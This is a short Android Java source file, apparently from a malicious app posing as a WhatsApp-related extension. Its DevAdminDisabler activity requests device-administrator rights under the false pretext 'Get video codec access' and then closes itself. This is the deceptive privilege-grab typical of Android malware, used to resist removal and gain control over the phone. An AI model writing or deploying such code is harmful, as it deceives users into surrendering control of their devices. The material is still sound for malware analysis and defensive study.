package exts.whats;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;

public class DevAdminDisabler extends Activity {
    private DevicePolicyManager deviceManager;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        this.deviceManager = (DevicePolicyManager) getSystemService("device_policy");
        checkDeviceAdmin();
        finish();
    }

    public void checkDeviceAdmin() {
        ComponentName componentName = new ComponentName(this, DevAdminReceiver.class);
        if (!this.deviceManager.isAdminActive(componentName)) {
            Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
            intent.putExtra("android.app.extra.DEVICE_ADMIN", componentName);
            intent.putExtra("android.app.extra.ADD_EXPLANATION", "Get video codec access");
            startActivity(intent);
        }
    }
}
